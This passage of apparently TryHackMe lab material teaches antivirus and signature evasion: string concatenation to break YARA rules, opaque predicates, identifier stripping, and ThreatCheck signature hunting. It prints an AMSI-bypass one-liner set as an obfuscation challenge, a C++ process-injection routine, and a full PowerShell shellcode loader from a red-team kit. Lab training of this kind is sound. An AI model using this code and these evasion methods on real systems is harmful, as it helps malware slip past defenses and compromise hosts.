>>> print(C)
Hello THM
>>>

```

Depending on the language used in a program, there may be different 
or multiple pre-defined operators than can be used for concatenation. 
Below is a small table of common languages and their corresponding 
pre-defined operators.

| **Language** | **Concatenation Operator** |
| --- | --- |
| Python | “**+**” |
| PowerShell | “**+**”, ”**,**”, ”**$**”, or no operator at all |
| C# | “**+**”, “**String.Join**”, “**String.Concat**” |
| C | “**strcat**” |
| C++ | “**+**”, “**append**” |

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under the **code-element** layer’s **data splitting/merging** sub-layer.

---

What
 does this mean for attackers? Concatenation can open the doors to 
several vectors to modify signatures or manipulate other aspects of an 
application. The most common example of concatenation being used in 
malware is breaking targeted **static signatures**, as covered in the [Signature Evasion room](https://tryhackme.com/room/signatureevasion).
 Attackers can also use it preemptively to break up all objects of a 
program and attempt to remove all signatures at once without hunting 
them down, commonly seen in obfuscators as covered in task 9.

Below we will observe a static **Yara** rule and attempt to use concatenation to evade the static signature.

```powershell
rule ExampleRule
{
    strings:
        $text_string = "AmsiScanBuffer"
        $hex_string = { B8 57 00 07 80 C3 }

    condition:
        $my_text_string or $my_hex_string
}

```

When
 a compiled binary is scanned with Yara, it will create a positive 
alert/detection if the defined string is present. Using concatenation, 
the string can be functionally the same but will appear as two 
independent strings when scanned, resulting in no alerts.

```powershell
IntPtr ASBPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/c033d156dae21c3683c5034fe031a452.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/c033d156dae21c3683c5034fe031a452.png)

```powershell
IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
```

If the second code block were to be scanned with the Yara rule, there would be no alerts!

---

Extending from concatenation, attackers can also use **non-interpreted characters**
 to disrupt or confuse a static signature. These can be used 
independently or with concatenation, depending on the 
strength/implementation of the signature. Below is a table of some 
common non-interpreted characters that we can leverage.

| **Character** | **Purpose** | **Example** |
| --- | --- | --- |
| Breaks | Break a single string into multiple sub strings and combine them | `('co'+'ffe'+'e')` |
| Reorders | Reorder a string’s components | `('{1}{0}'-f'ffee','co')` |
| Whitespace | Include white space that is not interpreted | `.( 'Ne' +'w-Ob' + 'ject')` |
| Ticks | Include ticks that are not interpreted | `d`own`LoAd`Stri`ng` |
| Random Case | Tokens are generally not case sensitive and can be any arbitrary case | `dOwnLoAdsTRing` |

---

Using the knowledge you have accrued throughout this task, obfuscate the following PowerShell snippet until it evades Defender’s detections.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

```

To
 get you started, we recommend breaking up each section of the code and 
observe how it interacts or is detected. You can then break the 
signature present in the independent section and add another section to 
it until you have a clean snippet.

Once you think your snippet is sufficiently obfuscated, submit it to the webserver at `http://MACHINE_IP` ; if successful a flag will appear in a pop-up.

If you are still stuck we have provided a walkthrough of the solution below.

*Solution Walkthrough (Click to read)*

**Obfuscation's Function for Analysis Deception**

After obfuscating basic
 functions of malicious code, it may be able to pass software detections
 but is still susceptible to human analysis. While not a security 
boundary without further policies, analysts and reverse engineers can 
gain deep insight into the functionality of our malicious application 
and halt operations.

Adversaries can leverage advanced logic and 
mathematics to create more complex and harder-to-understand code to 
combat analysis and reverse engineering.

For more information about reverse engineering, check out the [Malware Analysis module](https://tryhackme.com/module/malware-analysis).

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under other sub-layers of the **code-element layer**. Below is a table of methods covered by the taxonomy in the **obfuscating layout** and **obfuscating controls sub-layers**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/f9e4be87a9801b500d118e2c83e19c01.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/f9e4be87a9801b500d118e2c83e19c01.png)

| **Obfuscation Method** | **Purpose** |
| --- | --- |
| Junk Code | Add junk instructions that are non-functional, also known as a code stubs |
| Separation of Related Code | Separate related codes or instructions to increase difficulty in reading the program |
| Stripping Redundant Symbols | Strips symbolic information such as debug information or other symbol tables |
| Meaningless Identifiers | Transform a meaningful identifier to something meaningless |
| Implicit Controls | Converts explicit controls instructions to implicit instructions |
| Dispatcher-based Controls | Determines the next block to be executed during the runtime |
| Probabilistic Control Flows | Introduces replications of control flows with the same semantics but different syntax |
| Bogus Control Flows | Control flows deliberately added to a program but will never be executed |

In the upcoming tasks, we will demonstrate several of the above methods in an agnostic format.

Check out the [Sandbox Evasion room](https://tryhackme.com/room/sandboxevasion) for more information about anti-analysis and anti-reversing

**Code Flow and Logic**

**Control flow** is a critical component of a program’s execution that will define how a program will logically proceed. **Logic** is one of the most significant determining factors to an application’s control flow and encompasses various uses such as **if/else statements** or **for loops**.
 A program will traditionally execute from the top-down; when a logic 
statement is encountered, it will continue execution by following the 
statement.

Below is a table of some logic statements you may encounter when dealing with control flows or program logic.

| **Logic Statement** | **Purpose** |
| --- | --- |
| if/else | Executes only **if** a condition is met, **else** it will execute a different code block |
| try/catch | Will **try** to execute a code block and **catch** it if it fails to handle errors. |
| switch case | A **switch** will follow similar conditional logic to an if statement but checks several different possible conditions with **cases** before resolving to a **break** or **default** |
| for/while loop | A **for** loop will execute for a set amount of a condition. A **while** loop will execute until a condition is no longer met. |

To make this concept concrete, we can observe an example function and its corresponding **CFG** (**C**ontrol **F**low **G**raph) to depict it’s possible control flow paths.

```python
x = 10
if(x > 7):
	print("This executes")
else:
	print("This is ignored")

```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/cfc2504b9a4a76682d724413080e3729.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/cfc2504b9a4a76682d724413080e3729.png)

What
 does this mean for attackers? An analyst can attempt to understand a 
program’s function through its control flow; while problematic, logic 
and control flow is almost effortless to manipulate and make arbitrarily
 confusing. When dealing with control flow, an attacker aims to 
introduce enough obscure and arbitrary logic to confuse an analyst but 
not too much to raise further suspicion or potentially be detected by a 
platform as malicious.

In the upcoming task, we will discuss different control flow patterns an attacker can use to confuse an analyst.

**Arbitrary Control Flow Patterns**

To craft **arbitrary control flow patterns** we can leverage **maths**, **logic**, and/or other **complex algorithms** to inject a different control flow into a malicious function.

We can leverage **predicates**
 to craft these complex logic and/or mathematical algorithms. Predicates
 refer to the decision-making of an input function to return **true** or **false**.
 Breaking this concept down at a high level, we can think of a predicate
 similar to the condition an if statement uses to determine if a code 
block will be executed or not, as seen in the example in the previous 
task.

Applying this concept to obfuscation, **opaque predicates** are used to control a known output and input. The paper, [Opaque Predicate: Attack and Defense in Obfuscated Binary Code](https://etda.libraries.psu.edu/files/final_submissions/17513),
 states, “An opaque predicate is a predicate whose value is known to the
 obfuscator but is difficult to deduce. It can be seamlessly applied 
with other obfuscation methods such as junk code to turn reverse 
engineering attempts into arduous work.” Opaque predicates fall under 
the **bogus control flow** and **probabilistic control flow**
 methods of the taxonomy paper; they can be used to arbitrarily add 
logic to a program or refactor the control flow of a pre-existing 
function.

The topic of opaque predicates requires a deeper understanding of
 mathematics and computing principles, so we will not cover it in-depth,
 but we will observe one common example.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/c1a1b8196a13becaa1efec050260c81b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/c1a1b8196a13becaa1efec050260c81b.png)

The **Collatz Conjecture**
 is a common mathematical problem that can be used as an example of an 
opaque predicate. It states: If two arithmetic operations are repeated, 
they will return one from every positive integer. The fact that we know 
it will always output one for a known input (a positive integer) means 
it is a viable opaque predicate. For more information about the Collatz 
conjecture, refer to the [Collatz Problem](https://mathworld.wolfram.com/CollatzProblem.html). Below is an example of the Collatz conjecture applied in Python.

```python
x = 0
while(x > 1):
	if(x%2==1):
		x=x*3+1
	else:
		x=x/2
	if(x==1):
		print("hello!")
```

In the above code snippet, the Collatz conjecture will only perform its mathematical operations if `x > 1`, resulting in `1` or `TRUE`.
 From the definition of the Collatz problem, it will always return one 
for a positive integer input, so the statement will always return true 
if `x` is a positive integer greater than one.

To prove the efficacy of this opaque predicate, we can observe its **CFG** (**C**ontrol **F**low **G**raph)
 to the right. If this is what an interpreted function looks like, just 
imagine what a compiled function may look like to an analyst.

---

Using
 the knowledge you have accrued throughout this task, put yourself into 
the shoes of an analyst and attempt to decode the original function and 
output of the code snippet below.

If you correctly follow the print statements, it will result in a flag you can submit.

*Challenge Code Snippet (Click to view)*

`x = 3
swVar = 1
a = 112340857612345
b = 1122135047612359087
i = 0
case_1 = ["T","d","4","3","3","3","e","1","g","w","p","y","8","4"]
case_2 = ["1a","H","3a","4a","5a","3","7a","8a","d","10a","11a","12a","!","14a"]
case_3 = ["1b","2b","M","4b","5b","6b","c","8b","9b","3","11b","12b","13b","14b"]
case_4 = ["1c","2c","3c","{","5c","6c","7c","8c","9c","10c","d","12c","13c","14c"]
case_5 = ["1d","2d","3d","4d","D","6d","7d","o","9d","10d","11d","!","13d","14d"]
case_6 = ["1e","2e","3e","4e","5e","6e","7e","8e","9e","10e","11e","12e","13e","}"]

while (x > 1):
    if (x % 2 == 1):
        x = x * 3 + 1
    else:
        x = x / 2
    if (x == 1):
        for y in case_1:
            match swVar:
                case 1:
                    print(case_1[i])
                    a = 2
                    b = 214025
                    swVar = 2
                case 2:
                    print(case_2[i])
                    if (a > 10):
                        swVar = 6
                    else:
                        swVar = 3
                case 3:
                    print(case_3[i])
                    b = b + a
                    if (b < 10):
                        swVar = 5
                    else:
                        swVar = 4
                case 4:
                    print(case_4[i])
                    b -= b
                    swVar = 5
                case 5:
                    print(case_5[i])
                    a += a
                    swVar = 2
                case 6:
                    print(case_5[11])
                    print(case_6[i])
                    break
            i = i + 1`

**Protecting and Stripping Identifiable Information**

Identifiable 
information can be one of the most critical components an analyst can 
use to dissect and attempt to understand a malicious program. By 
limiting the amount of identifiable information (variables, function 
names, etc.), an analyst has, the better chance an attacker has they 
won't be able to reconstruct its original function.

At a high 
level, we should consider three different types of identifiable data: 
code structure, object names, and file/compilation properties. In this 
task, we will break down the core concepts of each and a case study of a
 practical approach to each.

---

# Object Names

Object
 names offer some of the most significant insight into a program's 
functionality and can reveal the exact purpose of a function. An analyst
 can still deconstruct the purpose of a function from its behavior, but 
this is much harder if there is no context to the function.

The importance of literal object names may change depending on if the language is **compiled**
 or **interpreted**. If an interpreted language such as **Python** or **PowerShell** is used, then all objects matter and must be modified. If a compiled language such as **C** or **C#**
 is used, only objects appearing in the strings are generally 
significant. An object may appear in the strings by any function that 
produces an **IO operation**.

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under the **code-element** layer’s **meaningless identifiers** method.

Below we will observe two basic examples of replacing meaningful identifiers for both an interpreted and compiled language.

---

As
 an example of a compiled language, we can observe a process injector 
written in C++ that reports its status to the command line.

```c
#include "windows.h"#include <iostream>#include <string>
using namespace std;

int main(int argc, char* argv[])
{
	unsigned char shellcode[] = "";

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	string leaked = "This was leaked in the strings";

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	cout << "Handle obtained for" << processHandle;
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	cout << "Buffer Created";
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	cout << "Process written with buffer" << remoteBuffer;
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	cout << "Closing handle" << processHandle;
	cout << leaked;

	return 0;
}

```

Let’s use strings to see exactly what was leaked when this source code is compiled.

```powershell
C:\>.\strings.exe "\Injector.exe"

Strings v2.54 - Search for ANSI and Unicode strings in binary images.
Copyright (C) 1999-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

!This program cannot be run inDOS mode.
>FU
z';
z';
...
[snip]
...
Y_^[
leaked
shellcode
2_^[]
...
[snip]
...
std::_Adjust_manually_vector_aligned
"invalid argument"
string too long
This was leaked in the strings
Handle obtained for
Buffer Created
Process written with buffer
Closing handle
std::_Allocate_manually_vector_aligned
bad allocation
Stack around the variable '
...
[snip]
...
8@9H9T9X9\\9h9|9
:$:(:D:H:
@1p1

```

Notice
 that all of the iostream was written to strings, and even the shellcode
 byte array was leaked. This is a smaller program, so imagine what a 
fleshed-out and un-obfuscated program would look like!

We can remove comments and replace the meaningful identifiers to resolve this problem.

```c
#include "windows.h"int main(int argc, char* argv[])
{
	unsigned char awoler[] = "";

	HANDLE awerfu;
	HANDLE rwfhbf;
	PVOID iauwef;

	awerfu = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	iauwef = VirtualAllocEx(awerfu, NULL, sizeof awoler, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(awerfu, iauwef, awoler, sizeof awoler, NULL);
	rwfhbf = CreateRemoteThread(awerfu, NULL, 0, (LPTHREAD_START_ROUTINE)iauwef, NULL, 0, NULL);
	CloseHandle(awerfu);

	return 0;
}

```

We should no longer have any identifiable string information, and the program is safe from string analysis.

---

As an example for an interpreted language we can observe the deprecated [Badger PowerShell loader](https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit/blob/main/deprecated/badger_template.ps1) from the [BRC4 Community Kit](https://github.com/paranoidninja/Brute-Ratel-C4-Community-Kit).

```powershell
Set-StrictMode -Version 2
[Byte[]] $Ait1m = @(0x3d, 0x50, 0x51, 0x57, 0x50, 0x4e, 0x5f, 0x50, 0x4f, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50)
[Byte[]] $ahv3I = @(0x34, 0x59, 0x38, 0x50, 0x58, 0x5a, 0x5d, 0x64, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50)
[Byte[]] $Moo5y = @(0x38, 0x64, 0x2f, 0x50, 0x57, 0x50, 0x52, 0x4c, 0x5f, 0x50, 0x3f, 0x64, 0x5b, 0x50)
[Byte[]] $ooR5o = @(0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x3e, 0x50, 0x4c, 0x57, 0x50, 0x4f, 0x17, 0x0b, 0x2c, 0x59, 0x5e, 0x54, 0x2e, 0x57, 0x4c, 0x5e, 0x5e, 0x17, 0x0b, 0x2c, 0x60, 0x5f, 0x5a, 0x2e, 0x57, 0x4c, 0x5e, 0x5e)
[Byte[]] $Reo5o = @(0x3d, 0x60, 0x59, 0x5f, 0x54, 0x58, 0x50, 0x17, 0x0b, 0x38, 0x4c, 0x59, 0x4c, 0x52, 0x50, 0x4f)
[Byte[]] $Reib3 = @(0x3d, 0x3f, 0x3e, 0x5b, 0x50, 0x4e, 0x54, 0x4c, 0x57, 0x39, 0x4c, 0x58, 0x50, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e)
[Byte[]] $Thah8 = @(0x3b, 0x60, 0x4d, 0x57, 0x54, 0x4e, 0x17, 0x0b, 0x33, 0x54, 0x4f, 0x50, 0x2d, 0x64, 0x3e, 0x54, 0x52, 0x17, 0x0b, 0x39, 0x50, 0x62, 0x3e, 0x57, 0x5a, 0x5f, 0x17, 0x0b, 0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57)
[Byte[]] $ii5Ie = @(0x34, 0x59, 0x61, 0x5a, 0x56, 0x50)
[Byte[]] $KooG5 = @(0x38, 0x54, 0x4e, 0x5d, 0x5a, 0x5e, 0x5a, 0x51, 0x5f, 0x19, 0x42, 0x54, 0x59, 0x1e, 0x1d, 0x19, 0x40, 0x59, 0x5e, 0x4c, 0x51, 0x50, 0x39, 0x4c, 0x5f, 0x54, 0x61, 0x50, 0x38, 0x50, 0x5f, 0x53, 0x5a, 0x4f, 0x5e)
[Byte[]] $io9iH = @(0x32, 0x50, 0x5f, 0x3b, 0x5d, 0x5a, 0x4e, 0x2c, 0x4f, 0x4f, 0x5d, 0x50, 0x5e, 0x5e)
[Byte[]] $Qui5i = @(0x32, 0x50, 0x5f, 0x38, 0x5a, 0x4f, 0x60, 0x57, 0x50, 0x33, 0x4c, 0x59, 0x4f, 0x57, 0x50)
[Byte[]] $xee2N = @(0x56, 0x50, 0x5d, 0x59, 0x50, 0x57, 0x1e, 0x1d)
[Byte[]] $AD0Pi = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x2c, 0x57, 0x57, 0x5a, 0x4e)
[Byte[]] $ahb3O = @(0x41, 0x54, 0x5d, 0x5f, 0x60, 0x4c, 0x57, 0x3b, 0x5d, 0x5a, 0x5f, 0x50, 0x4e, 0x5f)
[Byte[]] $yhe4c = @(0x2E, 0x5D, 0x50, 0x4C, 0x5F, 0x50, 0x3F, 0x53, 0x5D, 0x50, 0x4C, 0x4F)

function Get-Robf ($b3tz) {
    $aisN = [System.Byte[]]::new($b3tz.Count)
    for ($x = 0; $x -lt $aisN.Count; $x++) {
       $aisN[$x] = ($b3tz[$x] + 21)
    }
    return [System.Text.Encoding]::ASCII.GetString($aisN)
}
function Get-PA ($vmod, $vproc) {
    $a = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType((Get-Robf $KooG5))
    return ($a.GetMethod((Get-Robf $io9iH), [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null)).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($a.GetMethod((Get-Robf $Qui5i))).Invoke($null, @($vmod)))), $vproc))
}
function Get-TDef {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
        [Parameter(Position = 1)] [Type] $var_return_type = [Void]
    )
    $vtdef = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName((Get-Robf $Ait1m))), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule((Get-Robf  $ahv3I), $false).DefineType((Get-Robf $Moo5y), (Get-Robf $ooR5o), [System.MulticastDelegate])
    $vtdef.DefineConstructor((Get-Robf $Reib3), [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o))
    $vtdef.DefineMethod((Get-Robf $ii5Ie), (Get-Robf $Thah8), $var_return_type, $var_parameters).SetImplementationFlags((Get-Robf $Reo5o))
    return $vtdef.CreateType()
}

[Byte[]]$vopcode = @(BADGER_SHELLCODE)

$vbuf = ([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $AD0Pi)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))).Invoke([IntPtr]::Zero, $vopcode.Length, 0x3000, 0x04)
[System.Runtime.InteropServices.Marshal]::Copy($vopcode, 0x0, $vbuf, $vopcode.length)
([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $ahb3O)), (Get-TDef @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))).Invoke($vbuf, $vopcode.Length, 0x20, [ref](0)) | Out-Null
([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get-PA (Get-Robf $xee2N) (Get-Robf $yhe4c)), (Get-TDef @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([UInt32])))).Invoke(0, 0, $vbuf, [IntPtr]0, 0, [ref](0)) | Out-Null

```

You
 may notice that some cmdlets and functions are kept in their original 
state… why is that? Depending on your objectives, you may want to create
 an application that can still confuse reverse engineers after detection
 but may not look immediately suspicious. If a malware developer were to
 obfuscate all cmdlets and functions, it would raise the entropy
 in both interpreted and compiled languages resulting in higher EDR 
alert scores. It could also lead to an interpreted snippet appearing 
suspicious in logs if it is seemingly random or visibly heavily 
obfuscated.

# Code Structure

Code
 structure can be a bothersome problem when dealing with all aspects of 
malicious code that are often overlooked and not easily identified. If 
not adequately addressed in both interpreted and compiled languages, it 
can lead to signatures or easier reverse engineering from an analyst.

As covered in the aforementioned taxonomy paper, **junk code** and **reordering code**
 are both widely used as additional measures to add complexity to an 
interpreted program. Because the program is not compiled, an analyst has
 much greater insight into the program, and if not artificially inflated
 with complexity, they can focus on the exact malicious functions of an 
application.

Separation of related code can impact both 
interpreted and compiled languages and result in hidden signatures that 
may be hard to identify. A heuristic signature engine may determine 
whether a program is malicious based on the surrounding functions or API
 calls. To circumvent these signatures, an attacker can randomize the 
occurrence of related code to fool the engine into believing it is a 
safe call or function.

# File & Compilation Properties

More minor aspects of a compiled binary, such as the compilation
 method, may not seem like a critical component, but they can lead to 
several advantages to assist an analyst. For example, if a program is 
compiled as a debug build, an analyst can obtain all the available 
global variables and other program information.

The compiler will 
include a symbol file when a program is compiled as a debug build. 
Symbols commonly aid in debugging a binary image and can contain global 
and local variables, function names, and entry points. Attackers must be
 aware of these possible problems to ensure proper compilation practices
 and that no information is leaked to an analyst.

Luckily for 
attackers, symbol files are easily removed through the compiler or after
 compilation. To remove symbols from a compiler like **Visual Studio**, we need to change the compilation target from `Debug` to `Release` or use a lighter-weight compiler like **mingw.**

If we need to remove symbols from a pre-compiled image, we can use the command-line utility: `strip`.

The aforementioned white paper: [Layered Obfuscation Taxonomy](https://cybersecurity.springeropen.com/articles/10.1186/s42400-020-00049-3), summarizes these practices well under the **code-element** layer’s **stripping redundant symbols** method.

Below is an example of using strip to remove the symbols from a binary compiled in **gcc** with debugging enabled.

```

```

00:00

Several other properties should be considered before actively using a tool, such as entropy or hash. These concepts are covered in task 5 of the [Signature Evasion room](https://tryhackme.com/room/signatureevasion).

---

Using
 the knowledge you have accrued throughout this task, remove any 
meaningful identifiers or debug information from the C++ source code 
below using the AttackBox or your own virtual machine.

Once adequately obfuscated and stripped compile the source code using `MingW32-G++` and submit it to the webserver at `http://MACHINE_IP/`.

Note: the file name must be `challenge-8.exe` to receive the flag.

```powershell
#include "windows.h"
#include <iostream>
#include <string>
using namespace std;

int main(int argc, char* argv[])
{
	unsigned char shellcode[] = "";

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	string leaked = "This was leaked in the strings";

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	cout << "Handle obtained for" << processHandle;
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	cout << "Buffer Created";
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	cout << "Process written with buffer" << remoteBuffer;
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);
	cout << "Closing handle" << processHandle;
	cout << leaked;

	return 0;
}
```

## **SIGNATURE EVASION**

**Signature Identification**

Before jumping into breaking signatures, we need to understand and identify what we are looking for. As covered in [Introduction to Anti-Virus](https://tryhackme.com/room/introtoav),
 signatures are used by anti-virus engines to track and identify 
possible suspicious and/or malicious programs. In this task, we will 
observe how we can manually identify an exact byte where a signature 
starts.

When identifying signatures, whether manually or 
automated, we must employ an iterative process to determine what byte a 
signature starts at. By recursively splitting a compiled binary in half 
and testing it, we can get a rough estimate of a byte-range to 
investigate further.

We can use the native utilities `head`, `dd`, or `split`
 to split a compiled binary. In the below command prompt, we will walk 
through using head to find the first signature present in a msfvenom 
binary.

```

```

00:00

Once
 split, move the binary from your development environment to a machine 
with the anti-virus engine you would like to test on. If an alert 
appears, move to the lower half of the split binary and split it again. 
If an alert does not appear, move to the upper half of the split binary 
and split it again. Continue this pattern until you cannot determine 
where to go; this will typically occur around the kilobyte range.

Once you have reached the point at which you no longer accurately
 split the binary, you can use a hex editor to view the end of the 
binary where the signature is present.

```
0000C2E0  43 68 6E E9 0A 00 00 00 0C 4D 1A 8E 04 3A E9 89  Chné.....M.Ž.:é‰
0000C2F0  67 6F BE 46 01 00 00 6A 40 90 68 00 10 00 00 E9  go¾F...j@.h....é
0000C300  0A 00 00 00 53 DF A1 7F 64 ED 40 73 4A 64 56 90  ....Sß¡.dí@sJdV.
0000C310  6A 00 68 58 A4 53 E5 E9 08 00 00 00 15 0D 69 B6  j.hX¤Såé......i¶
0000C320  F4 AB 1B 73 FF D5 E9 0A 00 00 00 7D 43 00 40 DB  ô«.sÿÕé....}C.@Û
0000C330  43 8B AC 55 82 89 C3 90 E9 08 00 00 00 E4 95 8E  C‹¬U‚‰Ã.é....ä•Ž
0000C340  2C 06 AC 29 A3 89 C7 90 E9 0B 00 00 00 0B 32 AC  ,.¬)£‰Ç.é.....2¬

```

We have the location of a signature; how human-readable it is will be determined by the tool itself and the compilation method.

Now… no one wants to spend hours going back and forth trying to 
track down bad bytes; let’s automate it! In the next task, we will look 
at a few **FOSS** (**F**ree and **O**pen-**S**ource **S**oftware) solutions to aid us in identifying signatures in compiled code.

**Automating Signature Identification**

The process shown in 
the previous task can be quite arduous. To speed it up, we can automate 
it using scripts to split bytes over an interval for us. [Find-AVSignature](https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1) will split a provided range of bytes through a given interval.

Find-AVSignature

```powershell
PS C:\> . .\FInd-AVSignature.ps1
PS C:\> Find-AVSignature

cmdlet Find-AVSignature at command pipeline position 1
Supply values for the following parameters:
StartByte: 0
EndByte: max
Interval: 1000

Do you want to continue?
This script will result in 1 binaries being written to "C:\Users\TryHackMe"!
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): y
```

This script relieves a lot of the manual
 work, but still has several limitations. Although it requires less 
interaction than the previous task, it still requires an appropriate 
interval to be set to function properly. This script will also only 
observe strings of the binary when dropped to disk rather than scanning 
using the full functionality of the anti-virus engine.

To solve this problem we can use other **FOSS** (**F**ree and **O**pen-**S**ource **S**oftware) tools that leverage the engines themselves to scan the file, including [DefenderCheck](https://github.com/matterpreter/DefenderCheck), [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck), and [AMSITrigger](https://github.com/RythmStick/AMSITrigger). In this task, we will primarily focus on ThreatCheck and briefly mention the uses of AMSITrigger at the end.

---

# ThreatCheck

ThreatCheck is a fork of DefenderCheck and is arguably the most 
widely used/reliable of the three. To identify possible signatures, 
ThreatCheck leverages several anti-virus engines against split compiled 
binaries and reports where it believes bad bytes are present.

ThreatCheck does not provide a pre-compiled release to the public. 
For ease of use we have already compiled the tool for you; it can be 
found in `C:\Users\Administrator\Desktop\Tools`of the attached machine.

Below is the basic syntax usage of ThreatCheck.

ThreatCheck Help Menu

```powershell
C:\>ThreatCheck.exe --help
  -e, --engine    (Default: Defender) Scanning engine. Options: Defender,AMSI
  -f, --file      Analyze a file on disk
  -u, --url       Analyze a file from a URL
  --help          Display this help screen.
  --version       Display version information.

```

For our uses we only need to supply a file and optionally an engine; 
however, we will primarily want to use AMSITrigger when dealing with **AMSI** (**A**nti-**M**alware **S**can **I**nterface), as we will discuss later in this task.

ThreatCheck

```powershell
C:\>ThreatCheck.exe -f Downloads\Grunt.bin -e AMSI
	[+] Target file size: 31744 bytes
	[+] Analyzing...
	[!] Identified end of bad bytes at offset 0x6D7A
	00000000   65 00 22 00 3A 00 22 00  7B 00 32 00 7D 00 22 00   e·"·:·"·{·2·}·"·
	00000010   2C 00 22 00 74 00 6F 00  6B 00 65 00 6E 00 22 00   ,·"·t·o·k·e·n·"·
	00000020   3A 00 7B 00 33 00 7D 00  7D 00 7D 00 00 43 7B 00   :·{·3·}·}·}··C{·
	00000030   7B 00 22 00 73 00 74 00  61 00 74 00 75 00 73 00   {·"·s·t·a·t·u·s·
	00000040   22 00 3A 00 22 00 7B 00  30 00 7D 00 22 00 2C 00   "·:·"·{·0·}·"·,·
	00000050   22 00 6F 00 75 00 74 00  70 00 75 00 74 00 22 00   "·o·u·t·p·u·t·"·
	00000060   3A 00 22 00 7B 00 31 00  7D 00 22 00 7D 00 7D 00   :·"·{·1·}·"·}·}·
	00000070   00 80 B3 7B 00 7B 00 22  00 47 00 55 00 49 00 44   ·?³{·{·"·G·U·I·D
	00000080   00 22 00 3A 00 22 00 7B  00 30 00 7D 00 22 00 2C   ·"·:·"·{·0·}·"·,
	00000090   00 22 00 54 00 79 00 70  00 65 00 22 00 3A 00 7B   ·"·T·y·p·e·"·:·{
	000000A0   00 31 00 7D 00 2C 00 22  00 4D 00 65 00 74 00 61   ·1·}·,·"·M·e·t·a
	000000B0   00 22 00 3A 00 22 00 7B  00 32 00 7D 00 22 00 2C   ·"·:·"·{·2·}·"·,
